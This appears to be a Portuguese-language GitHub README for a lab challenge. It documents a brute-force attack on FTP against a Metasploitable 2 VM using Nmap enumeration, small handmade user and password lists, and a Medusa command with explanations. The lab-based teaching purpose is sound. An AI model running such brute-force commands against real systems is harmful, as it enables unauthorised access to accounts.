# Descrição do Desafio  

> Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta.

## Passo a passo  
- Fazer a enumerção - descobrir quais serviços estão disponíveis no sistema alvo, utilizando o Nmap.
- Criar listas de possíveis usuários e senhas. 
- Realizar o ataque.

## Comandos utilizados  
> Enumeração

- nmap -sV -p21,22,80,445,130 192.168.56.101  

  🧠 Resumo do que o comando faz
Escanear o host 192.168.56.101
Verificar se as portas 21, 22, 80, 445 e 130 estão abertas
Identificar quais serviços estão rodando
Mostrar a versão desses serviços  

- ftp 192.168.56.101

  🧠 Resumo do que o comando faz
Conecta ao servidor FTP no IP 192.168.56.101
Abre uma sessão para transferência de arquivos
Solicita login para acesso  

> Criar listas

- echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

  🧠 Resumo do que o comando faz
Cria um arquivo com vários nomes de usuários e salva em um arquivo .txt.  

- echo -e "123456\npassword\nmsfadmin" > pass.txt

  🧠 Resumo do que o comando faz
Cria um arquivo com várias senhas e salva em um aequivo .txt.  

> realizar o ataque

- medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

  👉 O que esse comando faz:

Realiza um ataque de força bruta no serviço FTP do IP 192.168.56.101, tentando várias combinações de usuários e senhas.

  🧠 Em uma frase:

Testa logins automaticamente no FTP usando uma lista de usuários (users.txt) e senhas (pass.txt), com 6 tentativas simultâneas.

⚙️ Resumo dos parâmetros:
-h → alvo (IP)
-U → lista de usuários
-P → lista de senhas
-M ftp → serviço FTP
-t 6 → 6 conexões paralelas (mais rápido)  

## Ferramentas 
[Kali Linux](https://www.kali.org/get-kali/#kali-platforms)  
[Medusa](https://www.kali.org/tools/medusa/)  
[Nmap](https://nmap.org/download)  
[Metasploitable](https://sourceforge.net/projects/metasploitable)  

# Autor  

<p>
    <p>Ailton Araújo<br>
    <a 
        href="https://github.com/ItinhoAraujo">
        GitHub
    </a><br>
      <a 
        href="https://www.linkedin.com/feed/">
        LinkedIn
    </a><br>
    <a 
        href="https://www.instagram.com/ailton.araujoo?igsh=Ynkzbm04a3pscGhw">
        Instagram
    </a>
</p>
<br/><br/>
<p>

---

  
